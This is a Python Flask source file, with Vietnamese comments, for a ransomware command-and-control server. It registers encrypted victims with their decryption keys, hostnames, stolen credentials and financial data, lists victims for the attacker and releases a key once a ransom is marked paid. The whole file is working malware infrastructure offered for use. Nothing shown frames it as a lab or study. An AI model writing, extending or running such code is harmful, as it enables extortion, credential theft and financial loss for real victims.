# manager-agent/c2_server.py
from flask import Flask, request, jsonify
import json, os, datetime

app  = Flask(__name__)
DATA = "c2_victims.json"

def _load():
    if os.path.exists(DATA):
        try:
            with open(DATA) as f:
                content = f.read().strip()
                if not content:
                    return {}          # file rỗng → trả về dict rỗng
                return json.loads(content)
        except json.JSONDecodeError:
            return {}                  # JSON lỗi → trả về dict rỗng
    return {}

def _save(d):
    with open(DATA, 'w') as f:
        json.dump(d, f, indent=2)

# Nạn nhân gọi sau khi bị mã hóa
@app.route('/register', methods=['POST'])
def register():
    d       = request.get_json()
    victims = _load()
    victims[d['victim_id']] = {
        'key':      d['key'],
        'files':    d['files'],
        'hostname': d['hostname'],
        'time':     datetime.datetime.now().isoformat(),
        'analysis': d.get('analysis', {}),
        'paid':     False,
    }
    _save(victims)

    a = d.get('analysis', {})
    print(f"\n[C&C] *** NEW VICTIM ***")
    print(f"      Host      : {d['hostname']}")
    print(f"      Files     : {d['files']} encrypted")
    print(f"      Size      : {a.get('total_size_kb', 0)} KB")
    print(f"      Customers : {a.get('customer_count', 0)}")
    print(f"      Value     : {a.get('estimated_value', 'Unknown')}")

    creds = a.get('credentials', [])
    if creds:
        print(f"\n      Credentials found ({len(creds)}):")
        for c in creds:
            print(f"        [{c['type']}] {c['file']} → {c['value']}")

    financial = a.get('financial', [])
    if financial:
        print(f"\n      Financial data:")
        print(f"        {' | '.join(financial[:5])}")

    print()
    return jsonify({'status': 'ok'})

# Attacker xem danh sách nạn nhân
@app.route('/victims')
def list_victims():
    return jsonify(_load())

# Attacker release key sau khi nhận tiền
@app.route('/release/<victim_id>')
def release(victim_id):
    victims = _load()
    if victim_id not in victims:
        return jsonify({'error': 'not found'}), 404
    victims[victim_id]['paid'] = True
    _save(victims)
    return jsonify({'key': victims[victim_id]['key']})

if __name__ == '__main__':
    print("[C&C] Server started on http://localhost:8888")
    print("[C&C] Waiting for victims...\n")
    app.run(port=8888, debug=False)